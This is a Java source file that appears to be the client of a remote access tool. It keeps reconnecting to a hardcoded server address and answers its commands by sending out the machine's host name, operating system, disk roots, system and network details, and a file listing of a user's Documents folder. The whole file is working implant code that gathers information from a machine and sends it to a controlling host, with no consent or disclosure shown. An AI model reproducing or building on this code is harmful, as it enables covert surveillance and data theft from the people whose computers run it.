package Client;

import Client.Tree.Tree;
import Client.InformationGathering.SystemInformation;
import Client.InformationGathering.SystemNetworkInformation;

import javax.swing.*;
import java.io.*;
import java.net.*;
import java.nio.file.Path;
import java.util.Arrays;


public class Client {
    private static final String IP = "192.168.1.133";
    private static final int PORT = 3055;

    public static void main(String[] args) {

        while (true) {

        try {
            System.out.println("Conectando...");
            Socket s = new Socket(IP, PORT);

            System.out.println("Conectado");

            PrintWriter writer = new PrintWriter(s.getOutputStream());
            ObjectOutputStream output = new ObjectOutputStream(s.getOutputStream());
            BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));

            while (true) {
                String sel = reader.readLine();
                switch (sel) {
                    case "PING", "IP" -> {
                        writer.println(s.getRemoteSocketAddress());
                        writer.flush();
                    }
                    case "CLOSE" -> {
                        s.close();
                        return;
                    }
                    case "PC_NAME" -> {
                        InetAddress addr = InetAddress.getLocalHost();
                        writer.println(addr.getHostName());
                        writer.flush();
                    }
                    case "OS" -> {
                        writer.println(System.getProperty("os.name"));
                        writer.flush();
                    }
                    case "TREE" -> new Thread(new Tree(new File("C:\\Users\\JAVIER\\Documents"), s)).start();
                    case "SYS_DETAILS"-> output.writeObject(new Object[]{new SystemNetworkInformation(),new SystemInformation()});
                    case "DISKS" -> {
                        File []files= File.listRoots();
                        String[]rutas = new String[files.length];
                        for (int i=0;i<files.length;i++){
                            rutas[i]=files[i].toString();
                        }
                        new ObjectOutputStream(s.getOutputStream()).writeObject(rutas);
                    }
                    default -> {
                    }
                }
            }
        } catch (ConnectException e) {
            System.out.println("Connection refused");
        } catch (SocketException ignored) {
            System.out.println("Connection reset");
        } catch (IOException e) {
            e.printStackTrace();
        }

        }

}

}